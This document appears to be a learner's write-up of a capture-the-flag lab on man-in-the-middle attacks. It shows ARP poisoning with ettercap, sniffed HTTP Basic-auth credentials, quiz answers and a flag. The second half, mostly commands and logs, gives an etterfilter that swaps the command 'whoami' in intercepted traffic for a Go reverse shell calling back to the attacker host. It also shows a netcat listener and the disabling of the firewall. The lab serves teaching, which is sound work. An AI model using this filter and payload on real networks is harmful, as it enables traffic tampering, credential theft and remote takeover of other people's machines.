TCP  192.168.12.10:47634 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:37 2023 [821772]
TCP  192.168.12.10:47634 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:19:37 2023 [860909]
TCP  192.168.12.20:80 --> 192.168.12.10:47634 | A (0)


Mon Feb  6 17:19:38 2023 [301644]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (7)
whoami


Mon Feb  6 17:19:38 2023 [341588]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:19:38 2023 [703133]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:19:38 2023 [718295]
TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | SA (0)


Mon Feb  6 17:19:38 2023 [730222]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:38 2023 [756177]
TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | AP (7)
whoami


Mon Feb  6 17:19:38 2023 [786531]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:38 2023 [788139]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:19:38 2023 [814660]
TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | A (0)


Mon Feb  6 17:19:42 2023 [763194]
TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | AP (4)
pwd


Mon Feb  6 17:19:42 2023 [778414]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:42 2023 [778628]
TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:19:42 2023 [794494]
TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | A (0)
Closing text interface...


Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...
Unified sniffing was stopped.

root@eve:/tmp# cat /etc/hosts
127.0.0.1 	localhost
192.168.12.10 	alice
192.168.12.20 	bob
192.168.12.66	eve

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

YWRtaW46czNjcjN0X1A0eno=
admin:s3cr3t_P4zz

Basic YWRtaW46czNjcjN0X3A0eno=not authenticatedadmin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
<li><a href="SimpleHTTPAuthServer.py">SimpleHTTPAuthServer.py</a>
<li><a href="test.txt">test.txt</a>
<li><a href="user.txt">user.txt</a>
</ul>
<hr>
</body>
</html>
admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/test.txt
OK

Re-ARPing the victims means sending new ARP messages to update the ARP caches of the hosts in the network to remove the ARP poison that was previously added. This is typically done to restore normal network operation after an ARP spoofing attack has been performed.

curl -u user:pass http://ip/

admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/user.txt
THM{wh0s_$n!ff1ng_0ur_cr3ds}

whoami, pwd,ls


```


Scan the network on eth1. Who's there? Enter their IP addresses in ascending order.  

*192.168.12.10, 192.168.12.20*

Which machine has an open well-known port?  

*192.168.12.20*

What is the port number?  

*80*

Can you access the content behind the service from your current position? (Nay/Yay)

*Nay*

Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay)  

tcpdump -vvA -i eth1

*Nay*

Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay)

ettercap -T -i eth1 -M arp

*Yay*

Who is using that service?  

hostname

 *alice*

What's the hostname the requests are sent to?  

*www.server.bob*

Which file is being requested?  

*test.txt*

What text is in the file?  

Just two letters

*OK*

Which credentials are being used for authentication? (username:password)  

the basic auth authorization "key" is just a base64 encoded credential pair

*admin:s3cr3t_P4zz*

Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?  

The second-last line displayed after pressing q (without the "...")

*RE-ARPing the victims*

Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay)  

*Yay*

What is the user.txt flag?  

*THM{wh0s_$n!ff1ng_0ur_cr3ds}*

You should also have seen some  rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?  

The type of connection you want to catch when compromising hosts allowing you to execute commands by calling back to your listener.

*reverse shell*

What commands are being executed? Answer in the order they are being executed.  

*whoami, pwd,ls*

Which of the listed files do you want?

Which of the listed files most likely contains the flag? (Just the file name.)

*root.txt*

### Man-in-the-Middle: Manipulation

As a pentester, your first approach would be to try to hack Bob's web server. For the purpose of this room, let's assume it's impossible. Also, capturing basic auth credentials won't help for password reuse or similar attacks.  

So, let's advance our ongoing ARP poisoning attack into a fully-fledged MITM that includes packet manipulation! As Alice's packets pass through your attacker machine (**eve**), we can tamper with them.

How can we go about doing this? Ettercap comes with an `-F` option that allows you to apply filters in the form of specified **etterfilter.ef** files for the session. These **.ef** files, however, have to be compiled from **etterfilter** source filter files (**.ecf**) first. Their source code syntax is similar to C code. To keep this task more beginner-friendly, we assume it won't matter if Alice detects our manipulation activities. For the sake of this room, we are only going to manipulate her commands and won't be taking any OPSEC precautions.

Which brave command of hers should volunteer for our audacious endeavor? How about… yes, whoami, of course!

Before you copy and paste the filter below, it's best to understand the **etterfilter** command and its source file syntax. Consult the man page by either running  `man etterfilter` or browsing the [linux.die.net/man/8/etterfilter](https://linux.die.net/man/8/etterfilter) page.  

Now, create a new etterfilter code file named **whoami.ecf** and try to write a filter matching Alice's source port and transport protocol as well as replacing **whoami** data with a reverse shell payload of your choice. To see the solution, click the dropdown arrow:

_Show possible solution (spoiler!)_  

In the end, your filter might look similar to this one, where **<reverse_shell>** contains the reverse shell payload you chose:  

`if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {       log(DATA.data, "/root/ettercap.log");       replace("whoami", "<reverse_shell>" );       msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");   }`

  
**Note:** Quotation marks need to be **[escaped](https://linux.die.net/abs-guide/escapingsection.html)**. So, in case you want your filter to **replace** e.g. `whoami` with `echo -e "whoami\nroot"`, then the quotation marks around `whoami\nroot` would have to be escaped like this: `replace("whoami", "echo -e \"whoami\nroot\" " )`

To see a solution for the reverse shell payload, click the dropdown arrow:

_Show possible solution (spoiler!)_

The following is an example reverse shell in Golang with quotation marks already escaped:

`echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &`

Finally, we need to compile the**.ecf** into an **.ef** file:

`etterfilter whoami.ecf -o whoami.ef`  

Don't forget to start your listener (backgrounded). For the upper example above, you could use:  

`nc -nvlp 6666 &`  

Not so fast! If anything, we still need to allow the incoming connection through the firewall. Disable **ufw** or create a corresponding **allow** rule; otherwise, Bob's reverse shell will be blocked by the firewall:

`ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp` or completely disable the firewall by running `ufw disable`

Now, run **ettercap** specifying your newly created **etterfilter** file:

`ettercap -T -i eth1 -M arp -F whoami.ef`  

A few seconds after executing this command, you should see the _"###### ETTERFILTER: …"_ message and/or _"Connection received on 192.168.12.20 …"_  in your Netcat output, which means you've just caught a reverse shell from Bob! Now, you can quit **ettercap** (with **q**), foreground your Netcat listener (with **fg**), and enjoy your shell!

**Note:** To restrict ettercap's ARP poisoning efforts to your actual targets and only display traffic between them, you can specify them as target groups 1 and 2 by using "///"-token annotation after the **-M arp** option:

`ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef`

**Hint:** In case the reverse shell won't work, try replacing **whoami** with a suitable **cat** command to get the flag.  

Answer the questions below

```
┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ cat whoami.ecf 
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
}

Este es un script de ettercap filter que modifica un paquete TCP si se cumple la condición especificada. La condición es que si el protocolo es TCP y el puerto origen es 4444 y el contenido del paquete contiene la cadena "whoami", se registrará el contenido del paquete en un archivo llamado "/root/ettercap.log". Luego, se reemplazará la cadena "whoami" con un comando que escribirá un programa en Go en el archivo "/tmp/t.go" y luego ejecutará ese programa en segundo plano. El programa en Go establecerá una conexión de shell inverso a la dirección IP "192.168.12.66" en el puerto 6666.

The above command is used to compile an etterfilter script file (with ".ecf" extension) into a binary etterfilter file (with ".ef" extension) that can be used by the Ettercap program. The "-o" option is used to specify the output file name. In this case, the compiled etterfilter file will be named "whoami.ef".

admin@eve:~$ nano whoami.ecf
admin@eve:~$ etterfilter whoami.ecf -o whoami.ef

etterfilter 0.8.3 copyright 2001-2019 Ettercap Development Team


 14 protocol tables loaded:
	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 

 13 constants loaded:
	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 

 Parsing source file 'whoami.ecf'  done.

 Unfolding the meta-tree  done.

 Converting labels to real offsets  done.

 Writing output to 'whoami.ef'  done.

 -> Script encoded into 9 instructions.


admin@eve:~$ ls
whoami.ecf  whoami.ef

sudo ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp

or

sudo ufw disable

admin@eve:~$ sudo ufw disable
[sudo] password for admin: 
Firewall stopped and disabled on system startup

┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ ssh admin@10.10.148.6  
admin@10.10.148.6's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 06 Feb 2023 05:45:33 PM UTC

  System load:  0.06               Users logged in:          1
  Usage of /:   68.9% of 16.85GB   IPv4 address for docker0: 172.17.0.1
  Memory usage: 46%                IPv4 address for eth0:    10.10.148.6
  Swap usage:   0%                 IPv4 address for eth1:    192.168.12.66
  Processes:    154                IPv4 address for virbr0:  192.168.122.1

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

25 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


         __/\\\______________/\\\_________________/\\\\\\___________________________________________________________________        
          _\/\\\_____________\/\\\________________\////\\\___________________________________________________________________       
           _\/\\\_____________\/\\\___________________\/\\\___________________________________________________________________      
            _\//\\\____/\\\____/\\\______/\\\\\\\\_____\/\\\________/\\\\\\\\_____/\\\\\_______/\\\\\__/\\\\\_______/\\\\\\\\__     
             __\//\\\__/\\\\\__/\\\_____/\\\/////\\\____\/\\\______/\\\//////____/\\\///\\\___/\\\///\\\\\///\\\___/\\\/////\\\_    
              ___\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\_____\/\\\_____/\\\__________/\\\__\//\\\_\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\__   
               ____\//\\\\\\//\\\\\_____\//\\///////______\/\\\____\//\\\________\//\\\__/\\\__\/\\\__\/\\\__\/\\\_\//\\///////___  
                _____\//\\\__\//\\\_______\//\\\\\\\\\\__/\\\\\\\\\__\///\\\\\\\\__\///\\\\\/___\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\_ 
                 ______\///____\///_________\//////////__\/////////_____\////////_____\/////_____\///___\///___\///____\//////////__
                    ________________________________________________________________/\\\________________________        
                     _______________________________________________________________\/\\\________________________       
                      _____/\\\____________________________________________/\\\______\/\\\________________________      
                       __/\\\\\\\\\\\_____/\\\\\_________________________/\\\\\\\\\\\_\/\\\_____________/\\\\\\\\__     
                        _\////\\\////____/\\\///\\\______________________\////\\\////__\/\\\\\\\\\\____/\\\/////\\\_    
                         ____\/\\\_______/\\\__\//\\\________________________\/\\\______\/\\\/////\\\__/\\\\\\\\\\\__   
                          ____\/\\\_/\\__\//\\\__/\\\_________________________\/\\\_/\\__\/\\\___\/\\\_\//\\///////___  
                           ____\//\\\\\____\///\\\\\/__________________________\//\\\\\___\/\\\___\/\\\__\//\\\\\\\\\\_ 
                            _____\/////_______\/////_____________________________\/////____\///____\///____\//////////__
               __/\\\\\\\\\\\\________________________________________________________________________________________        
                _\/\\\////////\\\______________________________________________________________________________________       
                 _\/\\\______\//\\\_______________________________/\\\\\\\\_____________________________________________      
                  _\/\\\_______\/\\\__/\\\____/\\\__/\\/\\\\\\____/\\\////\\\_____/\\\\\\\\______/\\\\\_____/\\/\\\\\\___     
                   _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\////\\\__\//\\\\\\\\\___/\\\/////\\\___/\\\///\\\__\/\\\////\\\__    
                    _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\//\\\__\///////\\\__/\\\\\\\\\\\___/\\\__\//\\\_\/\\\__\//\\\_   
                     _\/\\\_______/\\\__\/\\\___\/\\\_\/\\\___\/\\\__/\\_____\\\_\//\\///////___\//\\\__/\\\__\/\\\___\/\\\_  
                      _\/\\\\\\\\\\\\/___\//\\\\\\\\\__\/\\\___\/\\\_\//\\\\\\\\___\//\\\\\\\\\\__\///\\\\\/___\/\\\___\/\\\_ 
                       _\////////////______\/////////___\///____\///___\////////_____\//////////_____\/////_____\///____\///__
             ______________________/\\\\\___________________________/\\\\\__________/\\\\\\\\\\\____/\\\\\\\\\\\_______        
              ____________________/\\\///__________________________/\\\///\\\______/\\\/////////\\\_\/////\\\///________       
               ___________________/\\\____________________________/\\\/__\///\\\___\//\\\______\///______\/\\\___________      
                _____/\\\\\_____/\\\\\\\\\________________________/\\\______\//\\\___\////\\\_____________\/\\\___________     
                 ___/\\\///\\\__\////\\\//________________________\/\\\_______\/\\\______\////\\\__________\/\\\______/\\\_    
                  __/\\\__\//\\\____\/\\\__________________________\//\\\______/\\\__________\////\\\_______\/\\\_____\///__   
                   _\//\\\__/\\\_____\/\\\___________________________\///\\\__/\\\_____/\\\______\//\\\______\/\\\___________  
                    __\///\\\\\/______\/\\\_____________________________\///\\\\\/_____\///\\\\\\\\\\\/____/\\\\\\\\\\\__/\\\_ 
                     ____\/////________\///________________________________\/////_________\///////////_____\///////////__\///__
       __/\\\_________________/\\\\\\\\\_____/\\\________/\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\__________________/\\\\\\\\\_____        
        _\/\\\_______________/\\\\\\\\\\\\\__\///\\\____/\\\/__\/\\\///////////___/\\\///////\\\______________/\\\///////\\\___       
         _\/\\\______________/\\\/////////\\\___\///\\\/\\\/____\/\\\_____________\/\\\_____\/\\\_____________\///______\//\\\__      
          _\/\\\_____________\/\\\_______\/\\\_____\///\\\/______\/\\\\\\\\\\\_____\/\\\\\\\\\\\/________________________/\\\/___     
           _\/\\\_____________\/\\\\\\\\\\\\\\\_______\/\\\_______\/\\\///////______\/\\\//////\\\_____________________/\\\//_____    
            _\/\\\_____________\/\\\/////////\\\_______\/\\\_______\/\\\_____________\/\\\____\//\\\_________________/\\\//________   
             _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_____________\/\\\_____\//\\\______________/\\\/___________  
              _\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_______\/\\\_______\/\\\\\\\\\\\\\\\_\/\\\______\//\\\____________/\\\\\\\\\\\\\\\_ 
               _\///////////////__\///________\///________\///________\///////////////__\///________\///____________\///////////////__
____/\\\__/\\\______________________________________________________________________________________________________________________        
 ___\/\\\_\/\\\______________________________________________________________________________________________________________________       
  __/\\\\\\\\\\\\\____________________/\\\__________/\\\__________________________________________________________________/\\\\\\\\\__      
   _\///\\\///\\\/______/\\\\\\\\___/\\\\\\\\\\\__/\\\\\\\\\\\_____/\\\\\\\\___/\\/\\\\\\\______/\\\\\\\\__/\\\\\\\\\_____/\\\/////\\\_     
    ___\/\\\_\/\\\_____/\\\/////\\\_\////\\\////__\////\\\////____/\\\/////\\\_\/\\\/////\\\___/\\\//////__\////////\\\___\/\\\\\\\\\\__    
     __/\\\\\\\\\\\\\__/\\\\\\\\\\\_____\/\\\_________\/\\\_______/\\\\\\\\\\\__\/\\\___\///___/\\\___________/\\\\\\\\\\__\/\\\//////___   
      _\///\\\///\\\/__\//\\///////______\/\\\_/\\_____\/\\\_/\\__\//\\///////___\/\\\_________\//\\\_________/\\\/////\\\__\/\\\_________  
       ___\/\\\_\/\\\____\//\\\\\\\\\\____\//\\\\\______\//\\\\\____\//\\\\\\\\\\_\/\\\__________\///\\\\\\\\_\//\\\\\\\\/\\_\/\\\_________ 
        ___\///__\///______\//////////______\/////________\/////______\//////////__\///_____________\////////___\////////\//__\///__________


admin@eve:~$ nc -nvlp 6666 &
[1] 8738
admin@eve:~$ Listening on 0.0.0.0 6666


admin@eve:~$ sudo ettercap -T -i eth1 -M arp -F whoami.ef

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Content filters loaded from whoami.ef...
Listening on:
  eth1 -> 0E:D9:C1:ED:A6:C1
	  192.168.12.66/255.255.255.0
	  fe80::8862:1aff:fee7:9471/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Mon Feb  6 17:46:29 2023 [333492]
  192.168.12.10:0 --> 192.168.12.20:0 |  (0)


Mon Feb  6 17:46:29 2023 [333605]
  192.168.12.20:0 --> 192.168.12.10:0 |  (0)


Mon Feb  6 17:46:30 2023 [726743]
TCP  192.168.12.10:48196 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:46:30 2023 [733144]
TCP  192.168.12.20:80 --> 192.168.12.10:48196 | SA (0)


Mon Feb  6 17:46:30 2023 [740944]
TCP  192.168.12.10:48196 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:46:30 2023 [741346]
TCP  192.168.12.10:48196 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:46:30 2023 [749156]
TCP  192.168.12.20:80 --> 192.168.12.10:48196 | A (0)


Mon Feb  6 17:46:30 2023 [751154]
TCP  192.168.12.20:80 --> 192.168.12.10:48196 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:46:30 2023 [751371]
TCP  192.168.12.20:80 --> 192.168.12.10:48196 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:46:30 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:46:30 2023 [757024]
TCP  192.168.12.10:48196 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:46:30 2023 [758175]
TCP  192.168.12.10:48196 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:46:30 2023 [765102]
TCP  192.168.12.20:80 --> 192.168.12.10:48196 | A (0)


Mon Feb  6 17:46:31 2023 [998807]
TCP  192.168.12.10:4444 --> 192.168.12.20:44704 | AP (3)
ls


Mon Feb  6 17:46:32 2023 [5022]
TCP  192.168.12.20:44704 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:46:33 2023 [9519]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:46:33 2023 [13024]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:33 2023 [14363]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:46:33 2023 [21056]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:46:37 2023 [10737]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami


Mon Feb  6 17:46:37 2023 [56936]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:37 2023 [834276]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:37 2023 [834316]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | SA (0)


Mon Feb  6 17:46:37 2023 [834413]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:46:38 2023 [350567]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:46:38 2023 [357058]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | SA (0)


Mon Feb  6 17:46:38 2023 [365035]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:38 2023 [375345]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:46:38 2023 [381122]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:38 2023 [966813]
TCP  192.168.12.20:34768 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:38 2023 [966852]
TCP  192.168.12.66:6666 --> 192.168.12.20:34768 | SA (0)


Mon Feb  6 17:46:38 2023 [966951]
TCP  192.168.12.20:34768 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:46:41 2023 [11790]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:46:41 2023 [13044]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:42 2023 [377326]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:46:42 2023 [380998]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:42 2023 [381285]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:46:42 2023 [389117]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | A (0)


Mon Feb  6 17:46:42 2023 [777554]
TCP  192.168.12.10:48204 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:46:42 2023 [781072]
TCP  192.168.12.20:80 --> 192.168.12.10:48204 | SA (0)


Mon Feb  6 17:46:42 2023 [788969]
TCP  192.168.12.10:48204 --> 192.168.12.20:80 | A (0)
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:46:42 2023 [789366]
TCP  192.168.12.10:48204 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.


Mon Feb  6 17:46:42 2023 [797068]
TCP  192.168.12.20:80 --> 192.168.12.10:48204 | A (0)


Mon Feb  6 17:46:42 2023 [799122]
TCP  192.168.12.20:80 --> 192.168.12.10:48204 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:46:42 2023 [799341]
TCP  192.168.12.20:80 --> 192.168.12.10:48204 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:46:42 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:46:42 2023 [805059]
TCP  192.168.12.10:48204 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:46:42 2023 [805936]
TCP  192.168.12.10:48204 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:46:42 2023 [813104]
TCP  192.168.12.20:80 --> 192.168.12.10:48204 | A (0)


Mon Feb  6 17:46:45 2023 [12904]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:46:45 2023 [21015]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:46 2023 [378420]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
ls


Mon Feb  6 17:46:46 2023 [380965]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:46 2023 [382253]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:46:46 2023 [389002]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | A (0)


Mon Feb  6 17:46:49 2023 [14035]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:46:49 2023 [20989]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:50 2023 [379541]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:46:50 2023 [381001]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:51 2023 [809202]
TCP  192.168.12.20:34772 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:51 2023 [809242]
TCP  192.168.12.66:6666 --> 192.168.12.20:34772 | SA (0)


Mon Feb  6 17:46:51 2023 [809357]
TCP  192.168.12.20:34772 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:46:51 2023 [897959]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:46:51 2023 [901057]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | SA (0)


Mon Feb  6 17:46:51 2023 [908911]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:51 2023 [928788]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:46:51 2023 [932967]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:52 2023 [610340]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:53 2023 [15206]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:46:53 2023 [21058]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:53 2023 [624858]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:54 2023 [380753]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:46:54 2023 [388948]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:54 2023 [827445]
TCP  192.168.12.10:48212 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:46:54 2023 [829001]
TCP  192.168.12.20:80 --> 192.168.12.10:48212 | SA (0)


Mon Feb  6 17:46:54 2023 [836918]
TCP  192.168.12.10:48212 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:46:54 2023 [837420]
TCP  192.168.12.10:48212 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:46:54 2023 [845146]
TCP  192.168.12.20:80 --> 192.168.12.10:48212 | A (0)


Mon Feb  6 17:46:54 2023 [847040]
TCP  192.168.12.20:80 --> 192.168.12.10:48212 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:46:54 2023 [847340]
TCP  192.168.12.20:80 --> 192.168.12.10:48212 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:46:54 GMT.
